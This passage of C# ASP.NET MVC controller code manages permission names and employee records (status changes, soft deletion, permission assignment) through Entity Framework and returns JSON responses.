        [HttpPost]
        [ValidateAntiForgeryToken]
        [SessionTimeout]
        public ActionResult AddUserRightName(string UserRightName)
        {
            if (string.IsNullOrEmpty(UserRightName.Trim()))
            {
                return Json(new { Sucess = false }, JsonRequestBehavior.AllowGet);
            }
            UserRightPermission userRightPermissionDB = db.UserRightPermission.Where(s => s.UserRightPermissionName.Trim() == UserRightName.Trim()).FirstOrDefault();
            if (userRightPermissionDB != null)
            {
                return Json(new { Exist = true }, JsonRequestBehavior.AllowGet);
            }

            try
            {
                UserRightPermission userRightPermissionForInsert = new UserRightPermission();
                userRightPermissionForInsert.UserRightPermissionName = UserRightName;
                userRightPermissionForInsert.CreateBy = AppUtils.GetLoginEmployeeName();
                userRightPermissionForInsert.CreateDate = AppUtils.GetDateTimeNow();

                db.UserRightPermission.Add(userRightPermissionForInsert);
                db.SaveChanges();
                //.val(item.UserRightID).text(item.UserRightName));
                var lstUserRightList = db.UserRightPermission.Select(s => new { UserRightPermissionID = s.UserRightPermissionID, UserRightPermissionName = s.UserRightPermissionName }).ToList();

                return Json(new { Success = true, lstUserRight = lstUserRightList }, JsonRequestBehavior.AllowGet);
            }
            catch (Exception ex)
            {
                return Json(new { Sucess = false }, JsonRequestBehavior.AllowGet);
            }


        }
        [HttpPost]
        [ValidateAntiForgeryToken]
        [SessionTimeout]
        public ActionResult DeletePermission(int UserRightPermissionID)
        {

            int employeeCount = db.Employee.Where(s => s.UserRightPermissionID == UserRightPermissionID).Count();
            if (employeeCount > 0)
            {
                return Json(new { Success = false, UserRightUsed = true }, JsonRequestBehavior.AllowGet);
            }

            UserRightPermission userRightPermission = db.UserRightPermission.Where(s => s.UserRightPermissionID == UserRightPermissionID).FirstOrDefault();

            if (userRightPermission != null)
            {
                try
                {
                    db.Entry(userRightPermission).State = EntityState.Deleted;
                    db.SaveChanges();
                    return Json(new { Success = true, UserRightPermissionID = UserRightPermissionID }, JsonRequestBehavior.AllowGet);
                }
                catch (Exception ex)
                {
                    return Json(new { Success = false }, JsonRequestBehavior.AllowGet);
                }

            }
            else
            {
                return Json(new { Success = false }, JsonRequestBehavior.AllowGet);
            }
        }

        [HttpPost]
        [ValidateAntiForgeryToken]
        [SessionTimeout]
        public ActionResult UpdateEmployeeStatus(int EmployeeID, int EmployeeStatusID)
        {
            Employee employee = db.Employee.Where(s => s.EmployeeID == EmployeeID).FirstOrDefault();
            if (employee != null)
            {
                try
                {
                    employee.EmployeeStatus = EmployeeStatusID;
                    db.Entry(employee).State = EntityState.Modified;
                    db.SaveChanges();

                    return Json(new { Success = true, EmployeeID = EmployeeID, EmployeeStatusID = EmployeeStatusID }, JsonRequestBehavior.AllowGet);
                }
                catch (Exception ex)
                {
                    return Json(new { Success = false }, JsonRequestBehavior.AllowGet);
                }
            }
            else
            {
                return Json(new { Success = false }, JsonRequestBehavior.AllowGet);
            }
        }
        [HttpPost]
        [ValidateAntiForgeryToken]
        public ActionResult GetEmployeeStatusByEmployeeID(int EmployeeID)
        {
            Employee employee = db.Employee.Where(s => s.EmployeeID == EmployeeID).FirstOrDefault();
            if (employee != null)
            {
                return Json(new { Success = true, EmployeeID = EmployeeID, EmployeeStatusID = employee.EmployeeStatus }, JsonRequestBehavior.AllowGet);


            }
            else
            {
                return Json(new { Success = false }, JsonRequestBehavior.AllowGet);
            }
        }
        [HttpPost]
        [ValidateAntiForgeryToken]
        [SessionTimeout]
        public ActionResult DeleteEmployeeByEmployeeID(int EmployeeID)
        {
            Employee employee = db.Employee.Where(s => s.EmployeeID == EmployeeID).FirstOrDefault();
            if (employee != null)
            {
                try
                {
                    employee.EmployeeStatus = AppUtils.EmployeeStatusIsDelete;
                    db.Entry(employee).State = EntityState.Modified;
                    db.SaveChanges();

                    return Json(new { Success = true, EmployeeID = EmployeeID }, JsonRequestBehavior.AllowGet);
                }
                catch (Exception ex)
                {
                    return Json(new { Success = false }, JsonRequestBehavior.AllowGet);
                }
            }
            else
            {
                return Json(new { Success = false }, JsonRequestBehavior.AllowGet);
            }


        }

        [HttpPost]
        [ValidateAntiForgeryToken]
        [SessionTimeout]
        public ActionResult UpdateEmployeePermission(int EmployeeID, int UserRightID)
        {
            Employee employee = db.Employee.Where(s => s.EmployeeID == EmployeeID).FirstOrDefault();
            if (employee != null)
            {
                try
                {
                    employee.RoleID = AppUtils.EmployeeRole;
                    employee.UserRightPermissionID = UserRightID;
                    db.Entry(employee).State = EntityState.Modified;
                    db.SaveChanges();

                    return Json(new { Success = true, EmployeeID = EmployeeID, UserRightID = UserRightID }, JsonRequestBehavior.AllowGet);
                }
                catch (Exception ex)
                {
                    return Json(new { Success = false }, JsonRequestBehavior.AllowGet);
                }
            }
            else
            {
                return Json(new { Success = false }, JsonRequestBehavior.AllowGet);
            }
        }

        //protected override void Dispose(bool disposing)
        //{
        //    if (disposing)
        //    {
        //        db.Dispose();
        //    }
        //    base.Dispose(disposing);
        //}
    }
}